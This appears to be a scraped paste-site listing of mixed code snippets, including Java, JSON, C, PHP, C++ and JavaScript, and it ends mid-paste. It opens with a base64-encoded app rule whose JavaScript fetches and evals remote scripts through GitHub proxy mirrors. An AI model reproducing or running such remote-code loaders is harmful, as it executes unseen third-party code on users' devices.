CJwYXJhbXNcIjpcIntcXFwibmV3V2luZG93XFxcIjp0cnVlLFxcXCJ3aW5kb3dJZFxcXCI6XFxcIuiBmumYheKImueuoeeQhlxcXCJ9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIuiBmumYheKImlwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vZW1wdHkjbm9SZWNvcmRIaXN0b3J5IztnZXQ7VVRGLTg7e1VzZXItQWdlbnRATW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMO+8m++8myBXaW42NO+8m++8myB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNn1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJmaW5kX3J1bGVcIjpcImpzOihcXG4oKSA9PiB7XFxuICAgIHJlcXVpcmUoY29uZmlnLuS+nei1li5tYXRjaCgvaHR0cChzKT86XFxcXC9cXFxcLy4qXFxcXC8vKVswXSArIFxcXCJTcmNKdVNldC5qc1xcXCIpO1xcbiAgICBTUkNTZXQoKTtcXG59XFxuKSgpXCIsXCJncm91cFwiOlwi8J+UluW4uOeUqFwiLFwidWFcIjpcInBjXCIsXCJwcmVSdWxlXCI6XCJpZiAoIWNvbmZpZy7kvp3otZYpIHtcXG4gICAgLy/ov5znqIvkvp3otZbntKLlvJXmlofku7bku6PnkIblnLDlnYDliJfooahcXG4gICAgbGV0IHJlcXVpcmVsaXN0ID0gW3sgdXJsOiAnaHR0cHM6Ly9naHByb3h5Lm5ldC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vJywgc29ydDogMCB9LCB7IHVybDogJ2h0dHBzOi8vZ2hwcm94eS5jb20vaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsIHNvcnQ6IDAgfSwgeyB1cmw6ICdodHRwczovL2Nkbi5zdGF0aWNhbHkuY29tL2doLycsIHNvcnQ6IDAgfSwgeyB1cmw6ICdodHRwczovL2dpdGh1Yi5qZXZvbnMudmlwL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCBzb3J0OiAwIH1dXFxuICAgIGxldCByZXF1aXJlZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9yZXF1aXJlLmpzb25cXFwiO1xcbiAgICBpZiAoZmV0Y2gocmVxdWlyZWZpbGUpKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGV2YWwoXFxcInJlcXVpcmVsaXN0PVxcXCIgKyBmZXRjaChyZXF1aXJlZmlsZSkgKyBcXFwiO1xcXCIpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkgeyB9XFxuICAgIH1cXG4gICAgcmVxdWlyZWxpc3Quc29ydChmdW5jdGlvbiAoeCwgeSkge1xcbiAgICAgICAgaWYgKHguc29ydCA8IHkuc29ydCkge1xcbiAgICAgICAgICAgIHJldHVybiAtMTtcXG4gICAgICAgIH0gZWxzZSBpZiAoeC5zb3J0ID4geS5zb3J0KSB7XFxuICAgICAgICAgICAgcmV0dXJuIDE7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiAwO1xcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCByZXF1aXJlbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgdHJ5IHsgLy/ov5znqIvkvp3otZbntKLlvJVcXG4gICAgICAgICAgICByZXF1aXJlKHJlcXVpcmVsaXN0W2ldLnVybCArICdzcmM0ODU5Nzk2Mi9oay9KdS9yZXF1aXJlLmpzJywgeyB0aW1lb3V0OiAyMDAwIH0pO1xcbiAgICAgICAgICAgIGlmIChyZWx5ZmlsZSkge1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgcmVxdWlyZWxpc3RbaV0uc29ydCsrO1xcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHdyaXRlRmlsZShyZXF1aXJlZmlsZSwgSlNPTi5zdHJpbmdpZnkocmVxdWlyZWxpc3QpKTtcXG4gICAgaW5pdENvbmZpZyh7XFxuICAgICAgICDkvp3otZY6IHJlbHlmaWxlXFxuICAgIH0pO1xcbiAgICBsZXQgY2ZnZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9KdS9jb25maWcuanNvblxcXCI7XFxuICAgIGlmIChmaWxlRXhpc3QoY2ZnZmlsZSkpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICAgICAgSnVjb25maWdbXFxcIuS+nei1llxcXCJdID0gcmVseWZpbGU7XFxuICAgICAgICAgICAgd3JpdGVGaWxlKGNmZ2ZpbGUsIEpTT04uc3RyaW5naWZ5KEp1Y29uZmlnKSk7XFxuICAgICAgICB9IGNhdGNoIChlKSB7IH1cXG4gICAgfVxcbn1cXG4vL2J5LuW4heKImmDkurrmiY0g6IGa5qih5p2/77yBXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuS+nei1luaWh+S7tlxcXCIsXFxcInBhdGhcXFwiOlxcXCJjb25maWdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQgbWV0aG9kO1xcXFxubGV0IHJlbHk7XFxcXG5sZXQgY2ZnZmlsZSA9IFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnUvY29uZmlnLmpzb25cXFxcXFxcIjtcXFxcbmlmIChmaWxlRXhpc3QoY2ZnZmlsZSkpIHtcXFxcbiAgICBldmFsKFxcXFxcXFwibGV0IEp1Y29uZmlnPVxcXFxcXFwiICsgZmV0Y2goY2ZnZmlsZSkgKyBcXFxcXFxcIjtcXFxcXFxcIik7XFxcXG4gICAgbWV0aG9kID0gSnVjb25maWdbXFxcXFxcXCLkvp3otZZcXFxcXFxcIl0ubWF0Y2goL2h0dHAocyk/OlxcXFxcXFxcL1xcXFxcXFxcLy4qXFxcXFxcXFwvLylbMF0gKyAnU3JjSnVNZXRob2QuanMnO1xcXFxuICAgIHJlbHkgPSBKdWNvbmZpZ1tcXFxcXFxcIuS+nei1llxcXFxcXFwiXTtcXFxcbn1cXFxcbiQuZXhwb3J0cy5tZXRob2QgPSBtZXRob2Q7XFxcXG4kLmV4cG9ydHMucmVseSA9IHJlbHk7XFxcXG4kLmV4cG9ydHMudmVyc2lvbiA9IDE0O1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaOpeWPo+S7o+eggVxcXCIsXFxcInBhdGhcXFwiOlxcXCJqaWVrb3VcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQgbWV0aG9kO1xcXFxubGV0IGNmZ2ZpbGUgPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL0p1L2NvbmZpZy5qc29uXFxcXFxcXCI7XFxcXG5pZiAoZmlsZUV4aXN0KGNmZ2ZpbGUpKSB7XFxcXG4gICAgZXZhbChcXFxcXFxcImxldCBKdWNvbmZpZz1cXFxcXFxcIiArIGZldGNoKGNmZ2ZpbGUpICsgXFxcXFxcXCI7XFxcXFxcXCIpO1xcXFxuICAgIG1ldGhvZCA9IEp1Y29uZmlnW1xcXFxcXFwi5L6d6LWWXFxcXFxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcXFxcXC9cXFxcXFxcXC8uKlxcXFxcXFxcLy8pWzBdICsgJ1NyY0p1TWV0aG9kMi5qcyc7XFxcXG59XFxcXG5yZXF1aXJlKG1ldGhvZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5LqR5Y+j5Luk5a+85YWlXFxcIixcXFwicGF0aFxcXCI6XFxcImltcG9ydFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmZ1bmN0aW9uIGNsb3VkaW1wb3J0KHRpdGxlKSB7XFxcXG4gICAgbGV0IHJlbW90ZWZpbGU7XFxcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL0p1L2NvbmZpZy5qc29uXFxcXFxcXCI7XFxcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcXFxuICAgICAgICBldmFsKFxcXFxcXFwibGV0IEp1Y29uZmlnPVxcXFxcXFwiICsgZmV0Y2goY2ZnZmlsZSkgKyBcXFxcXFxcIjtcXFxcXFxcIik7XFxcXG4gICAgICAgIHJlbW90ZWZpbGUgPSBKdWNvbmZpZ1tcXFxcXFxcIuS+nei1llxcXFxcXFwiXS5tYXRjaCgvaHR0cChzKT86XFxcXFxcXFwvXFxcXFxcXFwvLipcXFxcXFxcXC8vKVswXSArICdTcmNKdVNldC5qcyc7XFxcXG4gICAgfVxcXFxuICAgIGlmKHJlbW90ZWZpbGUpe1xcXFxuICAgICAgICByZXF1aXJlKHJlbW90ZWZpbGUpO1xcXFxuICAgICAgICByZXR1cm4gSllpbXBvcnQoaW5wdXQsdGl0bGUpO1xcXFxuICAgIH1lbHNle1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ayoeacieeUqOi/h+iBmumYheKImuWwj+eoi+W6j++8n1xcXFxcXFwiO1xcXFxuICAgIH1cXFxcbn1cXFxcbiQuZXhwb3J0cyA9IGNsb3VkaW1wb3J0KFxcXFxcXFwi6IGa6ZiF4oiaXFxcXFxcXCIpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaQnOe0oumhtVxcXCIsXFxcInBhdGhcXFwiOlxcXCJzb3VzdW9wYWdlXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IHJlbHlmaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2NvbmZpZz9ydWxlPVxcXFxcXFwiK01ZX1JVTEUudGl0bGUpLnJlbHk7XFxcXG5yZXF1aXJlKHJlbHlmaWxlKTtcXFxcbmxldCBuYW1lID0gZ2V0UGFyYW0oXFxcXFxcXCJrZXl3b3JkXFxcXFxcXCIpO1xcXFxubGV0IHR5cGUgPSBnZXRQYXJhbShcXFxcXFxcInR5cGVcXFxcXFxcIik7XFxcXG5uZXdzb3VzdW9wYWdlKG5hbWUsdHlwZSxyZWx5ZmlsZSk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5a+85YWl56Gu6K6k6aG1XFxcIixcXFwicGF0aFxcXCI6XFxcImltcG9ydENvbmZpcm1cXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQgcmVseSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9jb25maWc/cnVsZT1cXFxcXFxcIitNWV9SVUxFLnRpdGxlKS5yZWx5O1xcXFxuXFxcXG5yZXF1aXJlKHJlbHkubWF0Y2goL2h0dHAocyk/OlxcXFxcXFxcL1xcXFxcXFxcLy4qXFxcXFxcXFwvLylbMF0gKyAnU3JjSnVTZXQuanMnKTtcXFxcbmltcG9ydENvbmZpcm0oTVlfUlVMRS50aXRsZSk7XFxcIn1dXCJ9IiwicGljVXJsIjoiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9tb3JlLzEyOS5wbmciLCJ0aXRsZSI6IuKZpeeuoeeQhi1WMy4zIn0=
DB3eQZjJ,Untitled,_GameDoctor_,Java,Friday 12th of April 2024 06:53:48 AM CDT,"public ItemStack head(String texture) {
        ItemStack itemStack1 = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
        SkullMeta headMeta = (SkullMeta) itemStack1.getItemMeta();
        GameProfile profile = new GameProfile(UUID.randomUUID(), null);
        profile.getProperties().put(""textures"", new Property(""textures"", texture));
        Field profileField = null;
        try {
            profileField = headMeta.getClass().getDeclaredField(""profile"");
            profileField.setAccessible(true);
            profileField.set(headMeta, profile);
        } catch (NoSuchFieldException | IllegalArgumentException | IllegalAccessException e1) {
            e1.printStackTrace();
        }
        itemStack1.setItemMeta(headMeta);
        return itemStack1;
    }"
gRcq4AzC,Untitled,tno2007,JSON,Friday 12th of April 2024 06:23:00 AM CDT,"{
	""operations"": [
    {
      ""entity"": ""new_mn1questionnaire"",
      ""action"": ""upsert"",
      ""mappings"": [
        {
          ""key"": ""$id"",
          ""value"": ""$.mn1.id""
        },
        {
          ""key"": ""new_over175"",
          ""value"": ""$.mn1.itdoesNot.matterWhere.yourDataIs.inTheSubmissionJson[0].new_over175_field1""
        },
        {
          ""key"": ""new_birthlocation"",
          ""value"": ""$.mn1.itdoesNot.matterWhere.yourDataIs.inTheSubmissionJson[0].new_birthlocation_field2""
        },
        {
          ""key"": ""new_over16"",
          ""value"": ""$.mn1.itdoesNot.matterWhere.yourDataIs.inTheSubmissionJson[0].new_over16_field3""
        }
      ]
    },
		{
			""entity"": ""new_address"",
			""action"": ""upsert"",
			""isArray"": true,
			""dataSync"": {
				""enable"": true,
				""useFiltersAsMappingKeys"": true,
				""selects"": [
					""new_addressline1""
				],
				""filters"": [
					{
						""key"": ""new_mn1questionnaireid"",
						""value"": ""$.mn1.id""
					}
				]
			},
			""basePath"": ""$.addresses[*]"",
			""mappings"": [
				{
					""key"": ""$id"",
					""value"": ""$.Id""
				},
				{
					""key"": ""new_addressline1"",
					""value"": ""$.new_AddressLine1""
				},
				{
					""key"": ""new_addressline2"",
					""value"": ""$.new_AddressLine2""
				},
				{
					""key"": ""new_posttownorcity"",
					""value"": ""$.new_PostTownOrCity""
				},
				{
					""key"": ""new_person"",
					""value"": ""$.new_person""
				},
				{
					""key"": ""new_mn1questionnaireid"",
					""value"": ""56d2a9f9-5af6-ee11-8d4f-00155d001d0b""
				}
			]
		}
	],
	""data"": {
		""clientId"": ""a161b1bb-72a9-dd11-a616-001f2965fc1c"",
		""mn1"": {
			""id"": ""56d2a9f9-5af6-ee11-8d4f-00155d001d0b"",
			""itdoesNot"": {
				""matterWhere"": {
					""yourDataIs"": {
						""inTheSubmissionJson"": [
							{
								""new_over175_field1"": ""true"",
								""new_birthlocation_field2"": ""Bethlehem"",
								""new_over16_field3"": true
							}
						]
					}
				}
			}
		},
		""addresses"": [
			{
				""Id"": null,
				""new_AddressLine1"": ""poekmon"",
				""new_AddressLine2"": ""pikachu"",
				""new_PostTownOrCity"": ""Ash"",
				""new_StateorProvince"": ""address1stateprovince"",
				""new_PostalCode"": ""address1postcode"",
				""new_FromDate"": ""2013-06-12"",
				""new_ToDate"": ""2011-09-12"",
				""new_person"": ""100000001""
			}
		]
	}
}"
fQHC49fh,data894,TestGuy1,JSON,Friday 12th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '918a99d451377de544acead3c2fadea743e22cace5291f9ba5f141e6ee2b92c7b621075745d04c55708ef123c64a079a5007ed9084b1f6151ff041145824d58b2af0f47fd90a1c3ada568ec9c0a7bab22a564cf55bd44f007009913c36bd0e0d53525f25ae139753c333049fba3cdc19e774d7a63847b6c9c400b0fe509e21c6',
  otherdata: [
    'cbb0c54233baf818eefa70515453239e',
    'bed0a641621836f1f67600f0e8e35229',
    'ad69a71fea1c1bf4ca14ba02b5716f4c',
    'bb7dbeb57b40acf68d51ddb0e4d746d0',
    '16523712fbf7118651e302f9ce33b205',
    '0e2d05a60564d26a1dd682d5ee2b5f4f',
    '386b79af9a06381a551e4589007fc65e',
    'f0af2d55cb30bed47c86b857b1c9f4b3'
  ]
}"
sy9MQ9EV,Seperate small letters and capped letters,Rejack,C,Friday 12th of April 2024 06:00:04 AM CDT,"#include <stdio.h>
#include < string.h >
#include <stdlib.h>

void small_cap(char* str, char** str_small, char** str_cap);

int main()
{
	char str[] = ""AaBb1231_Cc_)!@#B"";

	char* str_small, * str_cap;

	small_cap(str, &str_small, &str_cap);

	printf(""\nThe string is: %s\n"", str);

	if (str_small == NULL || str_cap == NULL)					// check null
	{
		printf(""allocation failed"");
		return 1;
	}
	
	printf(""\nCap: %s\nSmall: %s\n\n"", str_cap, str_small);

	free(str_small);
	free(str_cap);

	return 0;
}

void small_cap(char* str, char** str_small, char** str_cap)
{
	int len = strlen(str);
	int countC = 0, countS = 0, j = 0, z = 0;

	for (int i = 0; i < len; i++)
	{
		if (str[i] >= 'a' && str[i] <= 'z')
			countS++;

		else if (str[i] >= 'A' && str[i] <= 'Z')
			countC++;
	}

	*str_small = (char*)malloc(1 + countS * sizeof(char));
	*str_cap = (char*)malloc(1 + countC * sizeof(char));

	if (*str_small && *str_cap)
	{
		for (int i = 0; i < len; i++)
		{
			if (str[i] >= 'a' && str[i] <= 'z')
				(*str_small)[j++] = str[i];

			else if (str[i] >= 'A' && str[i] <= 'Z')
				(*str_cap)[z++] = str[i];
		}

		(*str_small)[j] = '\0';
		(*str_cap)[z] = '\0';
	}
}"
XeAeq3vJ,Untitled,mihailovly,Python,Friday 12th of April 2024 05:58:24 AM CDT,"def is_number(input_str):
    try:
        int(input_str)
        return True
    except ValueError:
        return False"
8JLGk5wM,WooCommerce Tabs as details disclosure element,daymobrew,PHP,Friday 12th of April 2024 05:50:26 AM CDT,"<?php
/**
 * Single Product tabs
 *
 * This template can be overridden by copying it to yourtheme/woocommerce/single-product/tabs/tabs.php.
 *
 * HOWEVER, on occasion WooCommerce will need to update template files and you
 * (the theme developer) will need to copy the new files to your theme to
 * maintain compatibility. We try to do this as little as possible, but it does
 * happen. When this occurs the version of the template file will be bumped and
 * the readme will list any important changes.
 *
 * @see     https://woo.com/document/template-structure/
 * @package WooCommerce\Templates
 * @version 3.8.0
 */

// Change tabs from ul/li and div to details/summary disclosure element.

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Filter tabs and allow third parties to add their own.
 *
 * Each tab is an array containing title, callback and priority.
 *
 * @see woocommerce_default_product_tabs()
 */
$product_tabs = apply_filters( 'woocommerce_product_tabs', array() );

if ( ! empty( $product_tabs ) ) : ?>

	<div class=""woocommerce-tabs wc-tabs-wrapper"">
			<?php foreach ( $product_tabs as $key => $product_tab ) : ?>
				<details class=""<?php echo esc_attr( $key ); ?>_tab"" id=""tab-title-<?php echo esc_attr( $key ); ?>"" role=""tab"" aria-controls=""tab-<?php echo esc_attr( $key ); ?>"">
					<summary><?php echo wp_kses_post( apply_filters( 'woocommerce_product_' . $key . '_tab_title', $product_tab['title'], $key ) ); ?></summary>
					<?php
					if ( isset( $product_tab['callback'] ) ) {
						call_user_func( $product_tab['callback'], $key, $product_tab );
					}
					?>
				</details>
			<?php endforeach; ?>

		<?php do_action( 'woocommerce_product_after_tabs' ); ?>
	</div>

<?php endif; ?>
"
bLsjsgvZ,szyfr,mint21,C++,Friday 12th of April 2024 05:36:18 AM CDT,"using namespace std;
#include <bits/stdc++.h>
int liczby[1000];
int main()
{
    ifstream fin(""wiadomosc.txt"");
    ofstream wyjscie(""wynik.txt"");
    string s1,s2,s3;
    int l1=0, l2=0,l3=0,l4=0;
    fin >> s1 >> s2 >> s3;
    fin.close();
    int a=0, b=0, k=0;
    for(int i=0; i<8; i++)
    {
        a=a*2+int(s2[i]-'0');
    }
    for(int i=8; i<16; i++)
    {
        b=b*2+int(s2[i]-'0');
    }
    for(int i=16; i<24; i++)
    {
        k=k*2+int(s2[i]-'0');
    }

    cout << ""a1="" << a << "" a2="" << b << "" k="" << k << endl;
    int a1=a,a2=b,r=0,i=0,j=0,sz,koniec=s1.size();
    while(i<koniec)
    {
        if(s3[j]=='-')
        {
            a1=a;
            a2=b;
            r=0;
            j++;
        }
        else
        {
            if(s3[j]=='|')
            {
                int kod =s1[i]+'A';
                if(kod<13)
                    kod=13+(12-kod);
                else
                    kod=12-(kod-13);
                wyjscie << char(kod+'A');
                cout << char(kod+'A');
            }
            if(s3[j]=='\\')
            {
                if(r==0) sz=a1;
                else if(r==1) sz=a2;
                r++;
                wyjscie << char(((int(s1[i]-'A')+sz)%26)+'A');
                cout << char(((int(s1[i]-'A')+sz)%26)+'A');
                liczby[sz]++;
            }
            if(s3[j]=='/')
            {
                if(r==0) sz=a1;
                else if(r==1) sz=a2;
                else {sz=(a1+a2)%k;a1=a2;a2=sz;}
                r++;
                wyjscie << char(((int(s1[i]-'A')+sz)%26)+'A');
                cout << char(((int(s1[i]-'A')+sz)%26)+'A');
                liczby[sz]++;
            }
            i++;j++;
        }
    }
    wyjscie.close();
}
"
xKGZeftV,Таймер обратного отсчета для десктопного квадратного стики,Luxup,JavaScript,Friday 12th of April 2024 05:25:25 AM CDT,"/* 
Чтобы настроить таймер отложенного закрытия под нужные требования, следует изменить два значения в переменной ""count"", в местах в которых нужно произвести стоит специальный комментарий, найти можно по слову ""count""
После всех настроек, комментарии следует удалить.
*/
<script>
function updateClickableZone() {
    const oldButton = document.querySelector('#%DIV_ID% .lx_close_button');
    const newButton = oldButton.cloneNode(true);
    newButton.innerHTML = '<svg width=""60"" height=""24"" fill=""none"" xmlns=""http://www.w3.org/2000/svg""><path d=""M10.485 6.06A8 8 0 0118.246 0h23.508a8 8 0 017.76 6.06l3.728 14.91A4 4 0 0057.123 24H60 0h2.877a4 4 0 003.88-3.03l3.728-14.91z"" fill=""#D1D6E0""></path><path id=""closeCross"" d=""M24.793 6.793a1 1 0 000 1.414L28.586 12l-3.793 3.793a1 1 0 001.414 1.414L30 13.414l3.793 3.793a1 1 0 001.414-1.414L31.414 12l3.793-3.793a1 1 0 00-1.414-1.414L30 10.586l-3.793-3.793a1 1 0 00-1.414 0z"" fill=""#575C66""></path><text x=""50%"" y=""50%"" dominant-baseline=""middle"" id=""svgCount"" text-anchor=""middle"" font-size=""12"" fill=""#575C66"">X</text></svg>';
    newButton.style.display='block';
    oldButton.parentNode.replaceChild(newButton, oldButton);
}

updateClickableZone();

function addCustomStyles() {
    const style = document.createElement('style');
    style.textContent = `
        button.lx_close_button.lx_close_button_visible, .lx_close_button {
            visibility: visible !important;
            pointer-events: auto !important;
        }
    `;
    document.head.appendChild(style);
}

addCustomStyles();

var lxAdUnit      = document.querySelector(""#%DIV_ID%"");
var lxCloseButton = document.querySelector(""#%DIV_ID% .lx_close_button"");

function lxCloseUnit() {
    while (lxAdUnit.hasChildNodes()) {
        lxAdUnit.removeChild(lxAdUnit.lastChild);
    }
};

let eventListener;
var closeButton = document.querySelector(""#%DIV_ID% .lx_close_button"");
var count = 10; /* Заменить на нужно кол-во секунд */
let closeCross = document.querySelector(""#closeCross"");
function updateStyles() {
  if (closeButton) {
    const textElement = closeButton.querySelector(""svg > text"");
    if (textElement) {
      textElement.textContent = count;

      if (count === 0) {
        textElement.style.display = ""none"";
        closeCross.style.display = ""block"";
        closeButton.classList.add(""lx_close_button_visible"");
        eventListener = true;
        lxCloseButton.addEventListener('click', lxCloseUnit);
      } else {
        textElement.style.display = ""block"";
        closeButton.classList.remove(""lx_close_button_visible"");
        count--;
        closeCross.style.display = ""none"";

        if (eventListener === true) {
          lxCloseButton.removeEventListener('click', lxCloseUnit);
        }

        setTimeout(updateStyles, 1000);
      }
    }
  }
}

let initialUpdateDone = false;

function handleDOMChange(mutationsList, observer) {
  for (let mutation of mutationsList) {
    if (mutation.type === ""childList"") {
      const closeButton = document.querySelector(""#%DIV_ID% .lx_close_button"");
      if (closeButton && !initialUpdateDone) {
        observer.disconnect();
        updateStyles();
        initialUpdateDone = true;
        break;
      }
    }
  }
}

const initialCloseButton = document.querySelector(""#%DIV_ID% .lx_close_button"");
if (initialCloseButton) {
  updateStyles();
  initialUpdateDone = true;
} else {
  const observer = new MutationObserver(handleDOMChange);
  observer.observe(document, { childList: true, subtree: true });
}

function resetTimer() {
  count = 10; /* Заменить на нужно кол-во секунд */
  const closeButton = document.querySelector(""#%DIV_ID% .lx_close_button"");
  if (closeButton) {
    closeButton.classList.remove(""lx_close_button_visible"");
  }
  updateStyles();
}
let resetTimerScheduled = false;

function waitForNotEmptyBlock() {
  const targetNode = document.querySelector(""#%DIV_ID%"");

  const config = { attributes: true, attributeFilter: [""class""] };

  const observer = new MutationObserver(function (mutationsList, observer) {
    for (let mutation of mutationsList) {
      if (
        mutation.type === ""attributes"" &&
        mutation.attributeName === ""class"" &&
        targetNode.classList.contains(""__lxG__not_empty_block"")
      ) {
        if (!resetTimerScheduled) {
          resetTimer();
          resetTimerScheduled = true;
          setTimeout(() => {
            resetTimerScheduled = false; 
          }, 5000);
        }
      }
    }
  });

  observer.observe(targetNode, config);
}

function waitForLoadingBlock() {
  const targetNode = document.querySelector(""#%DIV_ID%"");

  const config = { attributes: true, attributeFilter: [""class""] };

  const observer = new MutationObserver(function (mutationsList, observer) {
    for (let mutation of mutationsList) {
      if (
        mutation.type === ""attributes"" &&
        mutation.attributeName === ""class"" &&
        targetNode.classList.contains(""__lxG__loading_block"")
      ) {
        waitForNotEmptyBlock(); 
      }
    }
  });

  observer.observe(targetNode, config);
}
setTimeout(function() {
waitForLoadingBlock();
}, 5000);
</script>"
Bhyf189k,tile.cpp as of 2024-04-12,Kitomas,C++,Friday 12th of April 2024 05:24:35 AM CDT,"#include <tile.hpp>

using namespace kit;



void Scene::drawBg(){
  if(bmp_bg == nullptr) return;
  shape::point sizeBmp = bmp_bg->getSize();
  if(sizeBmp.x<1 || sizeBmp.y<1) return;


  if(stretch_bg){ //stretch entire background to entire canvas
    bmp_bg->blitRect();


  } else { //otherwise, repeat background bitmap in a tile pattern
    shape::rect dst; //destination rectangle
    dst.w = sizeBmp.x;
    dst.h = sizeBmp.y;

    shape::point sizeCanvas = gl_win->getCanvasSize();

    //increase x, then y until the entire canvas is drawn to
    for(dst.y = 0;  dst.y < sizeCanvas.y;  dst.y += dst.h)
    for(dst.x = 0;  dst.x < sizeCanvas.x;  dst.x += dst.w)
    {
      bmp_bg->blitRect(&dst, nullptr); //whole bitmap is used when src = nullptr
    }


  }
}
"
0LKLwEaC,tile.hpp as of 2024-04-12,Kitomas,C++,Friday 12th of April 2024 05:23:55 AM CDT,"#ifndef _TILE_HPP
#define _TILE_HPP

#include <globals.hpp>





struct Tile {
  kit::u16        id : 7;

  kit::u16   tileset : 1; //whether to use tileset a or b

  kit::u16 collide_a : 1; //'collide with top-left 12x12 section of tile?'
  kit::u16 collide_b : 1; //'collide with top-right 12x12 section of tile?'
  kit::u16 collide_c : 1; //'collide with bottom-left 12x12 section of tile?'
  kit::u16 collide_d : 1; //'collide with bottom-right 12x12 section of tile?'

  kit::u16      pass : 1; //allow passing through tile
  kit::u16  platform : 1; //allow falling through top side of tile conditionally

  kit::u16   _unused : 2;
};





struct Object;

typedef void (*Object_TickCallback)(Object* obj_a);

struct Object {
  kit::u32 type;
  kit::u32    _;
  Object_TickCallback funcUpdate;
};





//uncompressed scene data
struct Scene { //64B
  //pat is memory::alloc'd, bmp is not
  kit::Bitmap* bmp_bg = nullptr; //bitmap for background layer
  Tile*        pat_mg = nullptr; //pattern for midground (collision) layer
  Tile*        pat_fg = nullptr; //pattern for foreground layer (skipped if nullptr)
  //(length of pat_<mg/fg> is [TILESIZ_X*TILESIZ_Y])

  //these two are memory::alloc'd too
  Object*  objs          = nullptr; //pointer to associated object array,
  Object*  objs_original = nullptr;  //and whatever its original state was
  kit::u16 objs_len      = 0;

  kit::u16 edge_n; //scene id for north edge
  kit::u16 edge_s; //scene id for south edge
  kit::u16 edge_w; //scene id for west edge
  kit::u16 edge_e; //scene id for east edge

  kit::u16     music; //music id;  0 for no change, -1 (65535) to stop
  kit::u16 ambient_a; //ambient track id a;  0 for no change, -1 to stop
  kit::u16 ambient_b; //ambient track id b;  0 for no change, -1 to stop

  kit::u16  tileset_a; //1st associated tileset
  kit::u16  tileset_b; //2nd associated tileset
  bool visited_before; //used to reset object and npc properties between deaths
  bool     stretch_bg; //'stretch the bg over the entire screen?' (repeats otherwise)

  kit::u8 _padding8[2];


  void drawBg();
};





#endif /* _TILE_HPP */
"
rbZWj7Qw,platformer's main.cpp as of 2024-04-12,Kitomas,C++,Friday 12th of April 2024 05:23:11 AM CDT,"#include <globals.hpp>
#include <player.hpp>
#include <tile.hpp>

#include <stdio.h>
#include <stdlib.h>
#include <math.h>

using namespace kit;





Player player;


bool fullscreen = false;


bool handleEvents(){
  bool run = true;


  WindowEvent e;
  while(pollWindowEvent(&e))
  switch(e.type){
    case WINEVENT_WIN_CLOSE: _we_w_close: run = false; break;

    case WINEVENT_KEY_DOWN: {
      if(e.key.repeat) break;
      switch(e.key.vkey){
        case VKEY_ESCAPE    : goto _we_w_close;
        case VKEY_F11       : gl_win->setFullscreen(fullscreen^=1); break;
        case VKEY_BSLASH    : player.confused^=1; break;
        case VKEY_FSLASH    : player.enforceMaxVel^=1; break;
        case VKEY_ENTER     : {
          player.pos = shape::fpoint(CANVSIZ_X/2,CANVSIZ_Y/2-80);
          player.vel = shape::fpoint(0,0);
        }break;
        case VKEY_LEFT : player.acc.x += -PLAYER_SPEED; break;
